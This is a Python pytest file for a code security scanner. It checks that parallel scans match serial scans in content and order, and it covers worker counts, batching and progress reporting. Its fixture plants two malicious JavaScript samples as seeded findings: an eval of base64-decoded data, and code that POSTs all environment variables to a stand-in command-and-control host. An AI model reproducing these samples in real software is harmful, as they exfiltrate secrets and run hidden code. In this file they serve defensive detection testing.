"""Parallel execution.

The property that matters is not speed, it is that parallelism changes nothing
observable. A scan run across sixteen workers must produce exactly what a serial
scan produced, in the same order, or every downstream guarantee -- baselines,
caching, reproducible gates -- is void.

Speed is tested separately and loosely, because a timing assertion on shared CI
hardware is a flaky test rather than a useful one.
"""

from __future__ import annotations

import pytest

from cordon_scanner import Scanner
from cordon_scanner.core.config import Config
from cordon_scanner.core.parallel import (
    MAX_WORKERS,
    MIN_FILES_FOR_PARALLEL,
    ParallelScanner,
)


class TestWorkerCount:
    def test_small_scans_stay_serial(self) -> None:
        """Pool startup is tens of milliseconds per worker, which is most of the
        runtime on a few hundred files. A pre-commit hook must not pay it."""
        assert ParallelScanner.worker_count(8, file_count=10) == 1
        assert ParallelScanner.worker_count(0, file_count=MIN_FILES_FOR_PARALLEL - 1) == 1

    def test_explicit_single_worker_is_honoured(self) -> None:
        assert ParallelScanner.worker_count(1, file_count=100_000) == 1

    def test_large_scans_use_workers(self) -> None:
        assert ParallelScanner.worker_count(4, file_count=100_000) == 4

    def test_worker_count_is_capped(self) -> None:
        """A high-core runner spawning one worker per core over a medium
        repository spends more time starting processes than matching bytes."""
        assert ParallelScanner.worker_count(512, file_count=100_000) == MAX_WORKERS

    def test_auto_resolves_to_something_sane(self) -> None:
        count = ParallelScanner.worker_count(0, file_count=100_000)
        assert 1 <= count <= MAX_WORKERS


class TestBatching:
    def test_batches_are_balanced_by_bytes(self) -> None:
        """One large file and a thousand small ones are not the same work.
        Sizing by count leaves a worker holding the large file while the others
        idle, which is the usual reason a parallel scan is barely faster."""
        items = [(i, f"f{i}", 1000) for i in range(10)]
        batches = ParallelScanner.batch_by_bytes(items, target=3000)
        assert len(batches) > 1
        for batch in batches:
            assert sum(size for _, _, size in batch) <= 4000

    def test_a_huge_file_gets_its_own_batch(self) -> None:
        items = [(0, "small", 10), (1, "huge", 50_000_000), (2, "small2", 10)]
        batches = ParallelScanner.batch_by_bytes(items, target=1000)
        huge = [b for b in batches if any(name == "huge" for _, name, _ in b)]
        assert len(huge) == 1
        assert len(huge[0]) == 1

    def test_every_item_appears_exactly_once(self) -> None:
        """A batching bug that drops a file is a silent false negative across
        that file, which nothing downstream can detect."""
        items = [(i, f"f{i}", i * 137 % 9000) for i in range(500)]
        batches = ParallelScanner.batch_by_bytes(items, target=10_000)
        flat = [item for batch in batches for item in batch]
        assert sorted(flat) == sorted(items)

    def test_empty_input(self) -> None:
        assert ParallelScanner.batch_by_bytes([]) == []


@pytest.fixture
def repository(tmp_path):
    """A tree large enough to cross the parallel threshold."""
    root = tmp_path / "repo"
    root.mkdir()
    for i in range(MIN_FILES_FOR_PARALLEL + 60):
        (root / f"mod{i:04d}.js").write_text(
            f"export const value{i} = {i};\nexport function f{i}(a) {{ return a + {i}; }}\n"
        )
    # A handful of real findings, so the comparison is not between two empty
    # results.
    (root / "loader.js").write_text("const p = atob(BLOB);\neval(p);\n")
    (root / "telemetry.js").write_text(
        "const { execSync } = require('child_process');\n"
        "const e = JSON.stringify(process.env);\n"
        "fetch('https://c2.example.net/i', {method:'POST', body:e});\n"
        "execSync('true');\n"
    )
    return root


@pytest.mark.slow
class TestParallelEquivalence:
    def test_parallel_matches_serial_exactly(self, repository, tmp_path) -> None:
        """The guarantee. Parallelism must change nothing observable."""
        serial_cfg = Config.default().with_overrides(
            use_cache=False, limits=Config.default().limits.merged(max_workers=1)
        )
        parallel_cfg = Config.default().with_overrides(
            use_cache=False, limits=Config.default().limits.merged(max_workers=4)
        )

        serial = Scanner(serial_cfg).scan(repository)
        parallel = Scanner(parallel_cfg).scan(repository)

        assert [f.to_dict() for f in serial.findings] == [f.to_dict() for f in parallel.findings]

    def test_order_is_stable_across_worker_counts(self, repository) -> None:
        """Completion order depends on scheduling. Output order must not."""
        results = []
        for workers in (1, 2, 4):
            cfg = Config.default().with_overrides(
                use_cache=False,
                limits=Config.default().limits.merged(max_workers=workers),
            )
            results.append([f.fingerprint for f in Scanner(cfg).scan(repository).findings])

        assert results[0] == results[1] == results[2]

    def test_files_scanned_count_agrees(self, repository) -> None:
        """A batching or scheduling bug that drops files would show here before
        it showed anywhere else."""
        counts = []
        for workers in (1, 4):
            cfg = Config.default().with_overrides(
                use_cache=False,
                limits=Config.default().limits.merged(max_workers=workers),
            )
            counts.append(Scanner(cfg).scan(repository).stats.files_scanned)
        assert counts[0] == counts[1]


class TestCompletionOrder:
    """Batches are consumed as they finish, not in submission order.

    Waiting on futures in order means one slow batch holds back every batch
    behind it that has already finished, so a progress count stalls and then
    leaps -- which is the appearance of a hang that reporting progress exists to
    remove. Consuming them as they complete fixes that and makes collection
    order depend on scheduling, so these tests pin the property that makes it
    safe: nothing downstream may depend on that order.
    """

    def test_reversed_collection_produces_identical_output(self, repository, monkeypatch) -> None:
        """The guarantee stated directly. Every result carries its own index,
        and `ScanResult.sorted` orders by severity, risk, path, line, rule and
        fingerprint -- never by completion."""
        from cordon_scanner.core.parallel import ParallelScanner

        config = Config.default().with_overrides(
            use_cache=False, limits=Config.default().limits.merged(max_workers=4)
        )
        forward = Scanner(config).scan(repository)

        original = ParallelScanner.run

        def reversed_run(**kwargs):
            produced = original(**kwargs)
            return None if produced is None else list(reversed(produced))

        monkeypatch.setattr(ParallelScanner, "run", staticmethod(reversed_run))
        backward = Scanner(config).scan(repository)

        assert [f.to_dict() for f in forward.findings] == [f.to_dict() for f in backward.findings]
        assert forward.findings, "no findings, so this comparison proves nothing"

    def test_progress_is_reported_while_the_pool_runs(self, repository) -> None:
        """Not after it returns. Advancing only once every result was in made a
        parallel scan sit at 0 for its whole duration and then jump to
        complete."""
        seen: list[str] = []

        class Watcher:
            def phase(self, name: str, total: int | None = None) -> None:
                return None

            def advance(self, path: str = "") -> None:
                seen.append(path)

            def note(self, message: str) -> None:
                return None

            def finish(self) -> None:
                return None

        config = Config.default().with_overrides(
            use_cache=False, limits=Config.default().limits.merged(max_workers=4)
        )
        result = Scanner(config, progress=Watcher()).scan(repository)
        scanned = {f.location.path for f in result.findings if f.location}
        assert seen, "no file was ever reported"
        assert scanned <= set(seen) | {"."}, "a scanned file was never reported as progress"
